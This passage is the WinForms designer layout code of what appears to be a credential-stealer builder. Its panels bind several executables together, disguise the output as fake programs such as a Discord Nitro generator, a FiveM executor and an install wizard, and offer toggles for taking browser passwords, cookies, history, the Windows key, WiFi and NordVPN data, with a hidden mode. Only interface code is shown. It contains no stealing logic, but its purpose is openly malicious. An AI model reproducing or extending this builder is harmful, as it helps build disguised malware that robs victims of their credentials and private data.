            this.binderSite.Controls.Add(this.label48);
            this.binderSite.Controls.Add(this.label55);
            this.binderSite.Controls.Add(this.label63);
            this.binderSite.Controls.Add(this.label62);
            this.binderSite.Controls.Add(this.label61);
            this.binderSite.Controls.Add(this.label60);
            this.binderSite.Controls.Add(this.label56);
            this.binderSite.Location = new System.Drawing.Point(26, 29);
            this.binderSite.Name = "binderSite";
            this.binderSite.Size = new System.Drawing.Size(751, 522);
            this.binderSite.TabIndex = 21;
            // 
            // label64
            // 
            this.label64.AutoSize = true;
            this.label64.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label64.ForeColor = System.Drawing.Color.DarkRed;
            this.label64.Location = new System.Drawing.Point(99, 339);
            this.label64.Name = "label64";
            this.label64.Size = new System.Drawing.Size(521, 15);
            this.label64.TabIndex = 33;
            this.label64.Text = "Files you need to bind need to be named as same as titles on this site (ex. emExe" +
    "1) for first file.";
            // 
            // button13
            // 
            this.button13.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button13.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button13.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button13.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button13.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button13.ForeColor = System.Drawing.Color.DarkRed;
            this.button13.Location = new System.Drawing.Point(193, 279);
            this.button13.Name = "button13";
            this.button13.Size = new System.Drawing.Size(28, 24);
            this.button13.TabIndex = 31;
            this.button13.Text = "..";
            this.button13.UseVisualStyleBackColor = true;
            this.button13.Click += new System.EventHandler(this.button13_Click);
            // 
            // button12
            // 
            this.button12.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button12.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button12.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button12.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button12.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button12.ForeColor = System.Drawing.Color.DarkRed;
            this.button12.Location = new System.Drawing.Point(193, 225);
            this.button12.Name = "button12";
            this.button12.Size = new System.Drawing.Size(28, 24);
            this.button12.TabIndex = 31;
            this.button12.Text = "..";
            this.button12.UseVisualStyleBackColor = true;
            this.button12.Click += new System.EventHandler(this.button12_Click);
            // 
            // button10
            // 
            this.button10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button10.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button10.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button10.ForeColor = System.Drawing.Color.DarkRed;
            this.button10.Location = new System.Drawing.Point(193, 172);
            this.button10.Name = "button10";
            this.button10.Size = new System.Drawing.Size(28, 24);
            this.button10.TabIndex = 31;
            this.button10.Text = "..";
            this.button10.UseVisualStyleBackColor = true;
            this.button10.Click += new System.EventHandler(this.button10_Click);
            // 
            // button9
            // 
            this.button9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button9.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button9.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button9.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button9.ForeColor = System.Drawing.Color.DarkRed;
            this.button9.Location = new System.Drawing.Point(193, 119);
            this.button9.Name = "button9";
            this.button9.Size = new System.Drawing.Size(28, 24);
            this.button9.TabIndex = 31;
            this.button9.Text = "..";
            this.button9.UseVisualStyleBackColor = true;
            this.button9.Click += new System.EventHandler(this.button9_Click);
            // 
            // button11
            // 
            this.button11.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button11.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button11.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button11.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button11.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.button11.ForeColor = System.Drawing.Color.DarkRed;
            this.button11.Location = new System.Drawing.Point(193, 67);
            this.button11.Name = "button11";
            this.button11.Size = new System.Drawing.Size(28, 24);
            this.button11.TabIndex = 31;
            this.button11.Text = "..";
            this.button11.UseVisualStyleBackColor = true;
            this.button11.Click += new System.EventHandler(this.button11_Click);
            // 
            // label59
            // 
            this.label59.AutoSize = true;
            this.label59.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label59.ForeColor = System.Drawing.Color.DarkRed;
            this.label59.Location = new System.Drawing.Point(74, 278);
            this.label59.Name = "label59";
            this.label59.Size = new System.Drawing.Size(96, 20);
            this.label59.TabIndex = 32;
            this.label59.Text = "emExe5.exe";
            // 
            // label58
            // 
            this.label58.AutoSize = true;
            this.label58.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label58.ForeColor = System.Drawing.Color.DarkRed;
            this.label58.Location = new System.Drawing.Point(74, 224);
            this.label58.Name = "label58";
            this.label58.Size = new System.Drawing.Size(96, 20);
            this.label58.TabIndex = 32;
            this.label58.Text = "emExe4.exe";
            // 
            // label49
            // 
            this.label49.AutoSize = true;
            this.label49.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label49.ForeColor = System.Drawing.Color.DarkRed;
            this.label49.Location = new System.Drawing.Point(74, 171);
            this.label49.Name = "label49";
            this.label49.Size = new System.Drawing.Size(96, 20);
            this.label49.TabIndex = 32;
            this.label49.Text = "emExe3.exe";
            // 
            // label48
            // 
            this.label48.AutoSize = true;
            this.label48.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label48.ForeColor = System.Drawing.Color.DarkRed;
            this.label48.Location = new System.Drawing.Point(74, 118);
            this.label48.Name = "label48";
            this.label48.Size = new System.Drawing.Size(96, 20);
            this.label48.TabIndex = 32;
            this.label48.Text = "emExe2.exe";
            // 
            // label55
            // 
            this.label55.AutoSize = true;
            this.label55.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label55.ForeColor = System.Drawing.Color.DarkRed;
            this.label55.Location = new System.Drawing.Point(74, 66);
            this.label55.Name = "label55";
            this.label55.Size = new System.Drawing.Size(96, 20);
            this.label55.TabIndex = 32;
            this.label55.Text = "emExe1.exe";
            // 
            // label63
            // 
            this.label63.AutoSize = true;
            this.label63.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label63.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label63.Location = new System.Drawing.Point(239, 279);
            this.label63.Name = "label63";
            this.label63.Size = new System.Drawing.Size(29, 20);
            this.label63.TabIndex = 32;
            this.label63.Text = "file";
            // 
            // label62
            // 
            this.label62.AutoSize = true;
            this.label62.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label62.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label62.Location = new System.Drawing.Point(239, 225);
            this.label62.Name = "label62";
            this.label62.Size = new System.Drawing.Size(29, 20);
            this.label62.TabIndex = 32;
            this.label62.Text = "file";
            // 
            // label61
            // 
            this.label61.AutoSize = true;
            this.label61.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label61.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label61.Location = new System.Drawing.Point(239, 173);
            this.label61.Name = "label61";
            this.label61.Size = new System.Drawing.Size(29, 20);
            this.label61.TabIndex = 32;
            this.label61.Text = "file";
            // 
            // label60
            // 
            this.label60.AutoSize = true;
            this.label60.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label60.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label60.Location = new System.Drawing.Point(239, 120);
            this.label60.Name = "label60";
            this.label60.Size = new System.Drawing.Size(29, 20);
            this.label60.TabIndex = 32;
            this.label60.Text = "file";
            // 
            // label56
            // 
            this.label56.AutoSize = true;
            this.label56.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label56.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.label56.Location = new System.Drawing.Point(239, 67);
            this.label56.Name = "label56";
            this.label56.Size = new System.Drawing.Size(29, 20);
            this.label56.TabIndex = 32;
            this.label56.Text = "file";
            // 
            // fakesSite
            // 
            this.fakesSite.Controls.Add(this.backButton);
            this.fakesSite.Controls.Add(this.mercurialBox);
            this.fakesSite.Controls.Add(this.desBox);
            this.fakesSite.Controls.Add(this.wizardBox);
            this.fakesSite.Controls.Add(this.nitroBox);
            this.fakesSite.Controls.Add(this.cmdBox);
            this.fakesSite.Controls.Add(this.label69);
            this.fakesSite.Controls.Add(this.binderSite);
            this.fakesSite.Location = new System.Drawing.Point(1069, 88);
            this.fakesSite.Name = "fakesSite";
            this.fakesSite.Size = new System.Drawing.Size(751, 522);
            this.fakesSite.TabIndex = 22;
            // 
            // backButton
            // 
            this.backButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.backButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.backButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.backButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.backButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.backButton.ForeColor = System.Drawing.Color.DarkRed;
            this.backButton.Location = new System.Drawing.Point(638, 475);
            this.backButton.Name = "backButton";
            this.backButton.Size = new System.Drawing.Size(87, 24);
            this.backButton.TabIndex = 41;
            this.backButton.Text = "Go back";
            this.backButton.UseVisualStyleBackColor = true;
            this.backButton.Click += new System.EventHandler(this.backButton_Click);
            // 
            // mercurialBox
            // 
            this.mercurialBox.AutoSize = true;
            this.mercurialBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.mercurialBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.mercurialBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.mercurialBox.ForeColor = System.Drawing.Color.DarkRed;
            this.mercurialBox.Location = new System.Drawing.Point(46, 165);
            this.mercurialBox.Name = "mercurialBox";
            this.mercurialBox.Size = new System.Drawing.Size(153, 19);
            this.mercurialBox.TabIndex = 5;
            this.mercurialBox.Text = "Fake Mercurial Grabber";
            this.mercurialBox.UseVisualStyleBackColor = true;
            // 
            // desBox
            // 
            this.desBox.AutoSize = true;
            this.desBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.desBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.desBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.desBox.ForeColor = System.Drawing.Color.DarkRed;
            this.desBox.Location = new System.Drawing.Point(46, 139);
            this.desBox.Name = "desBox";
            this.desBox.Size = new System.Drawing.Size(191, 19);
            this.desBox.TabIndex = 5;
            this.desBox.Text = "Fake FiveM Executor (Desudo)";
            this.desBox.UseVisualStyleBackColor = true;
            // 
            // wizardBox
            // 
            this.wizardBox.AutoSize = true;
            this.wizardBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.wizardBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.wizardBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.wizardBox.ForeColor = System.Drawing.Color.DarkRed;
            this.wizardBox.Location = new System.Drawing.Point(46, 113);
            this.wizardBox.Name = "wizardBox";
            this.wizardBox.Size = new System.Drawing.Size(126, 19);
            this.wizardBox.TabIndex = 5;
            this.wizardBox.Text = "Fake Install Wizard";
            this.wizardBox.UseVisualStyleBackColor = true;
            // 
            // nitroBox
            // 
            this.nitroBox.AutoSize = true;
            this.nitroBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.nitroBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.nitroBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.nitroBox.ForeColor = System.Drawing.Color.DarkRed;
            this.nitroBox.Location = new System.Drawing.Point(46, 86);
            this.nitroBox.Name = "nitroBox";
            this.nitroBox.Size = new System.Drawing.Size(137, 19);
            this.nitroBox.TabIndex = 5;
            this.nitroBox.Text = "Fake Nitro Generator";
            this.nitroBox.UseVisualStyleBackColor = true;
            // 
            // cmdBox
            // 
            this.cmdBox.AutoSize = true;
            this.cmdBox.Cursor = System.Windows.Forms.Cursors.Hand;
            this.cmdBox.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.cmdBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.cmdBox.ForeColor = System.Drawing.Color.DarkRed;
            this.cmdBox.Location = new System.Drawing.Point(46, 59);
            this.cmdBox.Name = "cmdBox";
            this.cmdBox.Size = new System.Drawing.Size(81, 19);
            this.cmdBox.TabIndex = 4;
            this.cmdBox.Text = "Fake CMD";
            this.cmdBox.UseVisualStyleBackColor = true;
            // 
            // label69
            // 
            this.label69.AutoSize = true;
            this.label69.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label69.ForeColor = System.Drawing.Color.DarkRed;
            this.label69.Location = new System.Drawing.Point(32, 32);
            this.label69.Name = "label69";
            this.label69.Size = new System.Drawing.Size(116, 20);
            this.label69.TabIndex = 3;
            this.label69.Text = "Fake programs";
            // 
            // guna2TabControl1
            // 
            this.guna2TabControl1.Controls.Add(this.tabPage3);
            this.guna2TabControl1.Controls.Add(this.tabPage2);
            this.guna2TabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2TabControl1.ItemSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl1.Location = new System.Drawing.Point(0, 38);
            this.guna2TabControl1.Name = "guna2TabControl1";
            this.guna2TabControl1.SelectedIndex = 0;
            this.guna2TabControl1.Size = new System.Drawing.Size(701, 240);
            this.guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Honeydew;
            this.guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.Crimson;
            this.guna2TabControl1.TabButtonSize = new System.Drawing.Size(150, 22);
            this.guna2TabControl1.TabIndex = 77;
            this.guna2TabControl1.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.tabPage3.Controls.Add(this.label144);
            this.tabPage3.Controls.Add(this.hidesBox);
            this.tabPage3.Controls.Add(this.label143);
            this.tabPage3.Controls.Add(this.sVpnBox);
            this.tabPage3.Controls.Add(this.label123);
            this.tabPage3.Controls.Add(this.swifiBox);
            this.tabPage3.Controls.Add(this.label122);
            this.tabPage3.Controls.Add(this.swinkeyBox);
            this.tabPage3.Controls.Add(this.asd);
            this.tabPage3.Controls.Add(this.sbrhisBox);
            this.tabPage3.Controls.Add(this.label39);
            this.tabPage3.Controls.Add(this.sbrCookiesBox);
            this.tabPage3.Controls.Add(this.label65);
            this.tabPage3.Controls.Add(this.sbrpassBox);
            this.tabPage3.Location = new System.Drawing.Point(4, 26);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(693, 210);
            this.tabPage3.TabIndex = 3;
            this.tabPage3.Text = "Settings";
            // 
            // label144
            // 
            this.label144.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label144.AutoSize = true;
            this.label144.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label144.ForeColor = System.Drawing.Color.White;
            this.label144.Location = new System.Drawing.Point(8, 178);
            this.label144.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label144.Name = "label144";
            this.label144.Size = new System.Drawing.Size(74, 13);
            this.label144.TabIndex = 216;
            this.label144.Text = "Hidden Mode:";
            // 
            // hidesBox
            // 
            this.hidesBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.hidesBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.hidesBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.hidesBox.Location = new System.Drawing.Point(143, 173);
            this.hidesBox.Name = "hidesBox";
            this.hidesBox.Size = new System.Drawing.Size(53, 22);
            this.hidesBox.TabIndex = 217;
            // 
            // label143
            // 
            this.label143.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label143.AutoSize = true;
            this.label143.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label143.ForeColor = System.Drawing.Color.White;
            this.label143.Location = new System.Drawing.Point(8, 122);
            this.label143.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label143.Name = "label143";
            this.label143.Size = new System.Drawing.Size(64, 13);
            this.label143.TabIndex = 214;
            this.label143.Text = "VPN (Nord):";
            // 
            // sVpnBox
            // 
            this.sVpnBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.sVpnBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.sVpnBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.sVpnBox.Location = new System.Drawing.Point(143, 117);
            this.sVpnBox.Name = "sVpnBox";
            this.sVpnBox.Size = new System.Drawing.Size(53, 22);
            this.sVpnBox.TabIndex = 215;
            // 
            // label123
            // 
            this.label123.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label123.AutoSize = true;
            this.label123.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label123.ForeColor = System.Drawing.Color.White;
            this.label123.Location = new System.Drawing.Point(8, 150);
            this.label123.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label123.Name = "label123";
            this.label123.Size = new System.Drawing.Size(55, 13);
            this.label123.TabIndex = 212;
            this.label123.Text = "WiFi data:";
            // 
            // swifiBox
            // 
            this.swifiBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.swifiBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.swifiBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.swifiBox.Location = new System.Drawing.Point(143, 145);
            this.swifiBox.Name = "swifiBox";
            this.swifiBox.Size = new System.Drawing.Size(53, 22);
            this.swifiBox.TabIndex = 213;
            // 
            // label122
            // 
            this.label122.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label122.AutoSize = true;
            this.label122.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label122.ForeColor = System.Drawing.Color.White;
            this.label122.Location = new System.Drawing.Point(8, 94);
            this.label122.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label122.Name = "label122";
            this.label122.Size = new System.Drawing.Size(74, 13);
            this.label122.TabIndex = 210;
            this.label122.Text = "Windows key:";
            // 
            // swinkeyBox
            // 
            this.swinkeyBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.swinkeyBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.swinkeyBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.swinkeyBox.Location = new System.Drawing.Point(143, 89);
            this.swinkeyBox.Name = "swinkeyBox";
            this.swinkeyBox.Size = new System.Drawing.Size(53, 22);
            this.swinkeyBox.TabIndex = 211;
            // 
            // asd
            // 
            this.asd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.asd.AutoSize = true;
            this.asd.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.asd.ForeColor = System.Drawing.Color.White;
            this.asd.Location = new System.Drawing.Point(8, 66);
            this.asd.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.asd.Name = "asd";
            this.asd.Size = new System.Drawing.Size(83, 13);
            this.asd.TabIndex = 208;
            this.asd.Text = "Browser History:";
            // 
            // sbrhisBox
            // 
            this.sbrhisBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.sbrhisBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.sbrhisBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.sbrhisBox.Location = new System.Drawing.Point(143, 61);
            this.sbrhisBox.Name = "sbrhisBox";
            this.sbrhisBox.Size = new System.Drawing.Size(53, 22);
            this.sbrhisBox.TabIndex = 209;
            // 
            // label39
            // 
            this.label39.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label39.AutoSize = true;
            this.label39.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label39.ForeColor = System.Drawing.Color.White;
            this.label39.Location = new System.Drawing.Point(8, 39);
            this.label39.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label39.Name = "label39";
            this.label39.Size = new System.Drawing.Size(89, 13);
            this.label39.TabIndex = 206;
            this.label39.Text = "Browser Cookies:";
            // 
            // sbrCookiesBox
            // 
            this.sbrCookiesBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.sbrCookiesBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.sbrCookiesBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.sbrCookiesBox.Location = new System.Drawing.Point(143, 34);
            this.sbrCookiesBox.Name = "sbrCookiesBox";
            this.sbrCookiesBox.Size = new System.Drawing.Size(53, 22);
            this.sbrCookiesBox.TabIndex = 207;
            // 
            // label65
            // 
            this.label65.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label65.AutoSize = true;
            this.label65.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label65.ForeColor = System.Drawing.Color.White;
            this.label65.Location = new System.Drawing.Point(8, 11);
            this.label65.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label65.Name = "label65";
            this.label65.Size = new System.Drawing.Size(102, 13);
            this.label65.TabIndex = 204;
            this.label65.Text = "Browser Passwords:";
            // 
            // sbrpassBox
            // 
            this.sbrpassBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.sbrpassBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.sbrpassBox.CheckedFillColor = System.Drawing.Color.Crimson;
            this.sbrpassBox.Location = new System.Drawing.Point(143, 6);
            this.sbrpassBox.Name = "sbrpassBox";
            this.sbrpassBox.Size = new System.Drawing.Size(53, 22);
            this.sbrpassBox.TabIndex = 205;
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.tabPage2.Controls.Add(this.button6);
            this.tabPage2.Controls.Add(this.button5);
